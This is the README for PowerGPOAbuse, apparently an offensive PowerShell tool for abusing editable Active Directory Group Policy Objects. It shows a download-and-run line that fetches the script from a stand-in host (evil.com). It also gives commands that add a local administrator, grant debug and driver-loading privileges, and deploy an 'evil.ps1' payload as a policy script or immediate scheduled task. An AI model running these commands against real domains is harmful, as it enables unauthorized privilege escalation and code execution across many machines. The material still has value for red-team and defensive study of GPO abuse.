# PowerGPOAbuse
Powershell version of SharpGPOAbuse for those who can't compile or if their C2 can't execute .NET Assembly straightly from memory. Highly inspired by the [original](https://github.com/FSecureLABS/SharpGPOAbuse) C# version and the amazing [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1). 

Usage
=====================

Import the script
-----------------

* <code>PS> Import-Module .\PowerGPOAbuse.ps1</code>

* <code>PS> . .\PowerGPOAbuse.ps1</code>

* <code>PS> IEX (New-Object System.Net.WebClient).DownloadString('https://evil.com/PowerGPOAbuse.ps1')</code>

Exploitation
-----------------

* Adding a localadmin <code>PS> Add-LocalAdmin -Identity 'Bobby' -GPOIdentity 'SuperSecureGPO'</code>

* Assign a new right <code>PS> Add-UserRights -Rights "SeLoadDriverPrivilege","SeDebugPrivilege" -Identity 'Bobby' -GPOIdentity 'SuperSecureGPO'</code>

* Adding a New Computer/User script <code>PS> Add-ComputerScript/Add-UserScript -ScriptName 'EvilScript' -ScriptContent $(Get-Content evil.ps1) -GPOIdentity 'SuperSecureGPO'</code>

* Create an immediate task <code>PS> Add-UserTask/Add-ComputerTask -TaskName 'eviltask' -Command 'powershell.exe /c' -CommandArguments "'$(Get-Content evil.ps1)'" -Author Administrator</code>

Future changes
=====================

New exploitation functionality, better optimization, better flexibility.

if you find any bugs, idea to improve the script, or any feedback, feel free raise an issue or propose a pull requests ! 
